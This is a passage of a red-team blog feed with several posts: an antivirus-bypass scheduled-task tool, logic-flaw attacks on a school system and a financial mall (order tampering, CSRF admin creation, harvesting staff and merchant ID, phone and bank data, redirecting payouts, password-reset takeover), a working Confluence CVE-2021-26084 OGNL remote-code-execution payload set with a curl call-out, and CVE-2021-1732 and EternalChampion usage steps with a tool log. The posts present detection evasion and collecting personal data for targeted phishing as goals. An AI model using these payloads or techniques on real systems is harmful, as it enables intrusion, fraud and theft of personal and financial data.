src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Add%20A%20Scheduled%20Task%20BypassAV%EF%BC%88WEBSHELL%EF%BC%89/image-20210920145309610.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> ScheduledTask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Add A Scheduled Task BypassAV</title>
      <link href="2021/09/14/add-a-scheduled-task-bypassav/"/>
      <url>2021/09/14/add-a-scheduled-task-bypassav/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">Based on the idea, I developed a small tool for adding scheduled tasks by BYpassavMore personal tools you can go to my github:https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;YangsirRedTeamTools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Actual-Use"><a href="#Actual-Use" class="headerlink" title="Actual Use"></a>Actual Use</h2><pre class="line-numbers language-none"><code class="language-none">Very easy you must be know how to use:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Add%20a%20Scheduled%20Task%20BypassAV/14-1.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Add%20a%20Scheduled%20Task%20BypassAV/14-2.png"></p><pre class="line-numbers language-none"><code class="language-none">Because I don&#39;t want to make the CS&#39;exe bypass av, this is use the 360, So I use the add user&#39;s exe to show you the result<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Add%20a%20Scheduled%20Task%20BypassAV/14-3.png"></p><pre class="line-numbers language-none"><code class="language-none">If you encounter an error, please make an issue on the project<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> ScheduledTask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A school infrastructure system vulnerability discovery</title>
      <link href="2021/09/11/a-school-infrastructure-system-vulnerability-discovery/"/>
      <url>2021/09/11/a-school-infrastructure-system-vulnerability-discovery/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">All cases are authorized legal compliance projects. Do not carry out any penetration attacks without authorization. Please abide by the network security law Long time in the past, an authorization, in the process of the red team hit a school infrastructure systems, to improve access to sensitive information to gain more scores, thus progress conveniently find some loopholes, web vulnerability is very regular, mainly based on some logical loopholes to make a case to share, sure, of course, this is not all logical loopholes can add cent<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Buy-electricity-at-a-low-price"><a href="#Buy-electricity-at-a-low-price" class="headerlink" title="Buy electricity at a low price"></a>Buy electricity at a low price</h2><pre class="line-numbers language-none"><code class="language-none">Through the student account obtained, I successfully logged in to the infrastructure system and found that I could buy electricity bills. I tried to find logical loopholesAfter a few minutes of basic testing, it was confirmed that the place where the order was placed did not verify the order data, but directly received the data submitted by users, so as to realize the purchase of more water and electricity at a low priceBy default, 1 yuan buys 1.64 degrees，like this<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20school%20infrastructure%20system%20vulnerability%20discovery/studeng1.png"></p><pre class="line-numbers language-none"><code class="language-none">After confirming the recharge, catch the data packetI was just trying to guess, to see if I could find any holes in the logic, because the system was already working through the Web getshell, So change the count parameter to the amount you want to top up, which is also very small to avoid detection<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20school%20infrastructure%20system%20vulnerability%20discovery/student3.png"></p><pre class="line-numbers language-none"><code class="language-none">After releasing the modified data package and making automatic payment through the subsequent campus card, you will get the payment voucher and confirm that you can purchase 16.4 amount of electricity with 1 yuan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20school%20infrastructure%20system%20vulnerability%20discovery/student4.png"></p><h2 id="CSRF-added-by-administrator"><a href="#CSRF-added-by-administrator" class="headerlink" title="CSRF added by administrator"></a>CSRF added by administrator</h2><pre class="line-numbers language-none"><code class="language-none">After trying, I found that the administrator&#39;s account password is also a weak password. When I added the administrator&#39;s account, I found that there is also a CSRF vulnerability that can be successfully played  Add administrator functions as follows <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20school%20infrastructure%20system%20vulnerability%20discovery/admin1.png"></p><pre class="line-numbers language-none"><code class="language-none">Just fill in the form <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20school%20infrastructure%20system%20vulnerability%20discovery/admin2.png"></p><pre class="line-numbers language-none"><code class="language-none">Get data packetIt can be seen here that there is no token, no referer field, and all are transmitted in clear text. The user&#39;s account password is controllable and changeable Don&#39;t forget to delete this account when testing again later, or you can change the account name <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20school%20infrastructure%20system%20vulnerability%20discovery/admin3.png"></p><pre class="line-numbers language-none"><code class="language-none">Very simple, you can use burp to produce CSRF payload directly The successful confirmation after browser access is as follows <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20school%20infrastructure%20system%20vulnerability%20discovery/admin4.png"></p><pre class="line-numbers language-none"><code class="language-none">Confirm that the administrator account is successfully created in the background <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20school%20infrastructure%20system%20vulnerability%20discovery/admin5.png"></p><h2 id="Unauthorized-access-to-all-campus-employee-information"><a href="#Unauthorized-access-to-all-campus-employee-information" class="headerlink" title="Unauthorized access to all campus employee information"></a>Unauthorized access to all campus employee information</h2><pre class="line-numbers language-none"><code class="language-none">Through a fuzzy query function point in the system, you only need to enter the last name to obtain the staff information of the school. Basically, through this function point, you can obtain the organizational structure of the target, which provides great help for the directional penetration of progress <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20school%20infrastructure%20system%20vulnerability%20discovery/change1.png"></p><pre class="line-numbers language-none"><code class="language-none">Get data packet, after some testing, it must be passed by post. The get method cannot succeed, but it does not affect the final effect. Just traverse the last name directly <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20school%20infrastructure%20system%20vulnerability%20discovery/change2.png"></p><pre class="line-numbers language-none"><code class="language-none">There are a lot of sensitive information, such as name, Department, Email, ID card and mobile phone number. It is basically clear that the target personnel can be located. Here is only a case for explanation If the Intranet in the shell of this system doesn&#39;t move horizontally, I think you must know how to use this information to improve targeted social worker fishing <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20school%20infrastructure%20system%20vulnerability%20discovery/change3.png"></p><h2 id="Later-words"><a href="#Later-words" class="headerlink" title="Later words"></a>Later words</h2><pre class="line-numbers language-none"><code class="language-none">In my opinion, in the red team operation, it is important to obtain system permissions, but it is also very important to try to improve and obtain more sensitive information through such infrastructure systems. After all, there must be a lot of people using infrastructure systems. If you can find some logical vulnerabilities involving personal sensitive information, it will provide effective support for progress directed attacks <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Actual combat record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Logical Vulnerability </tag>
            
            <tag> Discovery Vulnerability </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A financial mall vulnerability discovery</title>
      <link href="2021/09/10/a-financial-mall-vulnerability-discovery/"/>
      <url>2021/09/10/a-financial-mall-vulnerability-discovery/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">All cases are authorized legal compliance projects. Do not carry out any penetration attacks without authorization. Please abide by the network security law  Recently just in the collation of computer disks, desensitization to share a financial target of the basic operation of large shopping mall vulnerability mining, a long time ago, when I digging a mall vulnerability found, mall has long been rectified and repaired, Now there is no vulnerability repair in this mallWhat I share is that I feel a few loopholes are more harmful, so I hope readers can better develop their ideas<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Get-other-merchant-information"><a href="#Get-other-merchant-information" class="headerlink" title="Get other merchant information"></a>Get other merchant information</h2><pre class="line-numbers language-none"><code class="language-none">Merchant background can obtain other merchant information by modifying the parameter userNo without authorization, including mobile phone number, ID card, name and other sensitive information. I believe you will use BURp to try to improve the operationNow go to your acount like this<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20financial%20mall%20vulnerability%20discovery/a1.png"></p><pre class="line-numbers language-none"><code class="language-none">Get your packet, the important things is the usernoid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20financial%20mall%20vulnerability%20discovery/a2.png"></p><pre class="line-numbers language-none"><code class="language-none">By changing the current personal userNo to the merchant number of others, sensitive information such as the target bank account name, bank card number, ID number and mobile phone number can be obtained<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20financial%20mall%20vulnerability%20discovery/a3.png"></p><pre class="line-numbers language-none"><code class="language-none">I&#39;m sure your must be know how to get more information by the burp to change target id like this<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20financial%20mall%20vulnerability%20discovery/a4.png"></p><h2 id="Modify-the-payment-information-of-others"><a href="#Modify-the-payment-information-of-others" class="headerlink" title="Modify the payment information of others"></a>Modify the payment information of others</h2><pre class="line-numbers language-none"><code class="language-none">The merchant&#39;s payment information office can modify the payment information of others beyond its authority through the modification of the userno parameter, and tamper with the bank account of others as the attacker&#39;s own account. I believe no merchant will go to see whether the payment account set up in the mall is his own every day. This will lead to a very, very large capital lossThe change payment information button like this:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20financial%20mall%20vulnerability%20discovery/a5.png"></p><pre class="line-numbers language-none"><code class="language-none">As I said, you can control the target account you want to modify through userno. The code desensitization part is the bank card information, so you must understand the harm <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20financial%20mall%20vulnerability%20discovery/a6.png"></p><h2 id="SMS-bombing-amp-vVerification-code-front-end-return-amp-Any-merchant-password-get"><a href="#SMS-bombing-amp-vVerification-code-front-end-return-amp-Any-merchant-password-get" class="headerlink" title="SMS bombing&amp;vVerification code front end return&amp;Any merchant password get"></a>SMS bombing&amp;vVerification code front end return&amp;Any merchant password get</h2><pre class="line-numbers language-none"><code class="language-none">The function node retrieves the password at the user login. According to the description of the vulnerability title, you must know how harmful it is<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20financial%20mall%20vulnerability%20discovery/a8.png"></p><pre class="line-numbers language-none"><code class="language-none">Note that the merchant ID should be filled in here <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20financial%20mall%20vulnerability%20discovery/a9.png"></p><pre class="line-numbers language-none"><code class="language-none">Vulnerability 1： I can send it successfully through multiple replays in a short time, which forms SMS bombing Vulnerability 2： The verification code is returned in the return package, so you will improve the verification code to be used for verification, so as to retrieve and modify the password Vulnerability 3：The front-end needs to fill in the merchant ID. after testing, it can be modified to the ID of other merchants, which means that the progress can change the password of other merchants to log in to the account. The picture is not displayed. It&#39;s too sensitive, just a description<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/A%20financial%20mall%20vulnerability%20discovery/a7.png"></p><h2 id="Later-words"><a href="#Later-words" class="headerlink" title="Later words"></a>Later words</h2><pre class="line-numbers language-none"><code class="language-none">In my opinion, the financial mall used in production is very vulnerable. In fact, there are more than these vulnerabilities. Because it is financial related, it mainly focuses on the vulnerabilities that can directly affect money <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Actual combat record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Logical Vulnerability </tag>
            
            <tag> Discovery Vulnerability </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ConfluenceRCE【CVE-2021-26084】</title>
      <link href="2021/09/09/confluencerce-cve-2021-26084/"/>
      <url>2021/09/09/confluencerce-cve-2021-26084/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">Remote attacker in authenticated or in certain circumstances without authentication, by constructing a malicious data OGNL expressions injection attacks to RCE.Affected version:Confluence Server &amp; Confluence Data Center&lt; 6.13.23Confluence Server &amp; Confluence Data Center&lt; 7.11.6Confluence Server &amp; Confluence Data Center&lt; 7.12.5Confluence Server &amp; Confluence Data Center&lt; 7.4.11Confluence Server &amp; Confluence Data Center&lt; 7.13.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">If you want to study you maybe can go to build a docker environment you can go to the vulhub, it;&#39;s very easy to build&#39;:https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;tree&#x2F;master&#x2F;confluence&#x2F;CVE-2021-26084<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="RCE-Unauthorized-Interface1"><a href="#RCE-Unauthorized-Interface1" class="headerlink" title="RCE Unauthorized Interface1"></a>RCE Unauthorized Interface1</h2><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;yourtar&#x2F;pages&#x2F;doenterpagevariables.action<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ConfluenceRCE%E3%80%90CVE-2021-26084%E3%80%91/1.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Easy to inject like this：POST /pages/doenterpagevariables.action HTTP/1.1Host: yourtarAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/87.0.4280.88 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: <span class="token number">1062</span><span class="token assign-left variable">queryString</span><span class="token operator">=</span>%5cu0027%2b%7b233*233%7d%2b%5cu0027<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ConfluenceRCE%E3%80%90CVE-2021-26084%E3%80%91/2.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Then you must be <span class="token builtin class-name">exec</span> your attack command:POST /pages/doenterpagevariables.action HTTP/1.1Host: yourtarAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/87.0.4280.88 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: <span class="token number">1062</span><span class="token assign-left variable">queryString</span><span class="token operator">=</span>%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022id%5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ConfluenceRCE%E3%80%90CVE-2021-26084%E3%80%91/3.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ConfluenceRCE%E3%80%90CVE-2021-26084%E3%80%91/4.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Also you can use the dnslog:POST /pages/doenterpagevariables.action HTTP/1.1Host: yourtarAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/87.0.4280.88 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: <span class="token number">251</span><span class="token assign-left variable">queryString</span><span class="token operator">=</span>queryString<span class="token operator">=</span>aaa<span class="token punctuation">\</span>u0027%2b<span class="token comment"># &#123;\u0022\u0022[\u0022class\u0022].forName(\u0022java.lang.Runtime\u0022).getMethod(\u0022getRuntime\u0022,null).invoke(null,null).exec(\u0022curl XXXXXX.XXXX.XXX\u0022)&#125;%2b\u0027</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ConfluenceRCE%E3%80%90CVE-2021-26084%E3%80%91/5.png"></p><h2 id="RCE-Unauthorized-Interface2"><a href="#RCE-Unauthorized-Interface2" class="headerlink" title="RCE Unauthorized Interface2"></a>RCE Unauthorized Interface2</h2><pre class="line-numbers language-none"><code class="language-none">Also easy to attack you must be exec your command<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ConfluenceRCE%E3%80%90CVE-2021-26084%E3%80%91/6.png"></p><h2 id="RCE-authorized-Interface"><a href="#RCE-authorized-Interface" class="headerlink" title="RCE authorized Interface"></a>RCE authorized Interface</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">I thinke you must be know how to attack again /pages/createpage.action?spaceKey<span class="token operator">=</span>EX<span class="token operator">&amp;</span><span class="token assign-left variable">src</span><span class="token operator">=</span>quick-create<span class="token operator">&amp;</span><span class="token assign-left variable">queryString</span><span class="token operator">=</span>%5cu0027%2b%7b233*233%7d%2b%5cu0027<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Simple repetition </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> RCE </tag>
            
            <tag> Confluence </tag>
            
            <tag> CVE-2021-26084 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-1732 Windows Privilege promotion</title>
      <link href="2021/09/07/cve-2021-1732-windows-privilege-promotion/"/>
      <url>2021/09/07/cve-2021-1732-windows-privilege-promotion/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">BITTER APT&#39;s 0day exploit, used in one of its disclosed attacks, allows ordinary user processes to be given the highest SYSTEM privileges locally, by Win32kFull! XxxCreateWindowEx function in a user state callback caused by the flag bit setting and the corresponding offset Settings are not synchronized, the local user executed the exploit program to obtain system permissionsAffected version:Windows Server, version 20H2 (Server Core Installation)Windows 10 Version 20H2 for ARM64-based SystemsWindows 10 Version 20H2 for 32-bit SystemsWindows 10 Version 20H2 for x64-based SystemsWindows Server, version 2004 (Server Core installation)Windows 10 Version 2004 for x64-based SystemsWindows 10 Version 2004 for ARM64-based SystemsWindows 10 Version 2004 for 32-bit SystemsWindows Server, version 1909 (Server Core installation)Windows 10 Version 1909 for ARM64-based SystemsWindows 10 Version 1909 for x64-based SystemsWindows 10 Version 1909 for 32-bit SystemsWindows Server 2019 (Server Core installation)Windows Server 2019Windows 10 Version 1809 for ARM64-based SystemsWindows 10 Version 1809 for x64-based SystemsWindows 10 Version 1809 for 32-bit SystemsWindows 10 Version 1803 for ARM64-based SystemsWindows 10 Version 1803 for x64-based Systems<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><pre class="line-numbers language-none"><code class="language-none">Confirm the local version, in my opinion maybe this exp is very easy&amp;useful to attack PC win10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-1732%20Windows%20Privilege%20promotion/1.png"></p><pre class="line-numbers language-none"><code class="language-none">Modify something of the public EXP, but I am not try bypass AV, If target have EDRorAV maybe failed to attack, but in my local environment is success, such as can be add user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-1732%20Windows%20Privilege%20promotion/2.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/CVE-2021-1732%20Windows%20Privilege%20promotion/3.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Windows Privilege Promotion </tag>
            
            <tag> LPE </tag>
            
            <tag> CVE-2021-1732 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MS17010 Common ETERNAL Series Attack</title>
      <link href="2021/09/07/ms17010-common-eternal-series-attack/"/>
      <url>2021/09/07/ms17010-common-eternal-series-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">Maybe talke about the 17010 you just know the ETERNALBLUE? Now I will take more way to attack the ETERNAL*, for supplement the ms17010 bypass attack basic operation，Because of the local environment, I will mainly use ETERNALCHAMPION as an example<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><pre class="line-numbers language-none"><code class="language-none">This way using the nsa public tools to attack, basic operation also very easy, may be you can follow me generate the sc, inject the sc, your dll attackUsing the public tools you must be found the vulnerable like this <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MS17010%20Common%20ETERNAL%20Series%20Attack/image-20210906152723840.png"></p><pre class="line-numbers language-none"><code class="language-none">Using Doublepulsar to generate the sc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MS17010%20Common%20ETERNAL%20Series%20Attack/image-20210906152941606.png"></p><pre class="line-numbers language-none"><code class="language-none">Copy your sc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MS17010%20Common%20ETERNAL%20Series%20Attack/image-20210906153207538.png"></p><pre class="line-numbers language-none"><code class="language-none">Samlpe inject your sc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MS17010%20Common%20ETERNAL%20Series%20Attack/image-20210906153332882.png"></p><pre class="line-numbers language-none"><code class="language-none">If you use the ETERNALROMANCE you will be know this dir you just give the sc dir, don&#39;t need to paste your sc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MS17010%20Common%20ETERNAL%20Series%20Attack/image-20210906160108494.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MS17010%20Common%20ETERNAL%20Series%20Attack/image-20210906153533456.png"></p><pre class="line-numbers language-none"><code class="language-none">Confirm your success <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MS17010%20Common%20ETERNAL%20Series%20Attack/image-20210906153954834.png"></p><pre class="line-numbers language-none"><code class="language-none">Using your dll to attack <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MS17010%20Common%20ETERNAL%20Series%20Attack/image-20210906154737291.png"></p><pre class="line-numbers language-none"><code class="language-none">Confirm your success <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MS17010%20Common%20ETERNAL%20Series%20Attack/image-20210906154805782.png"></p><pre class="line-numbers language-none"><code class="language-none">Success to add a admin user <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MS17010%20Common%20ETERNAL%20Series%20Attack/image-20210906154901790.png"></p> <pre class="line-numbers language-none"><code class="language-none">Other Eternal you can use the way to easy attack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Order-record-examlpe"><a href="#Order-record-examlpe" class="headerlink" title="Order record examlpe"></a>Order record examlpe</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fb <span class="token operator">></span> use smbtouch<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Entering Plugin Context :: Smbtouch<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Applying Global Variables<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Set NetworkTimeout <span class="token operator">=</span><span class="token operator">></span> <span class="token number">60</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Set TargetIp <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.159.143fb Touch <span class="token punctuation">(</span>Smbtouch<span class="token punctuation">)</span> <span class="token operator">></span> execute<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Preparing to Execute Smbtouch<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Redirection OFF<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Configure Plugin Local Tunnels<span class="token punctuation">[</span>+<span class="token 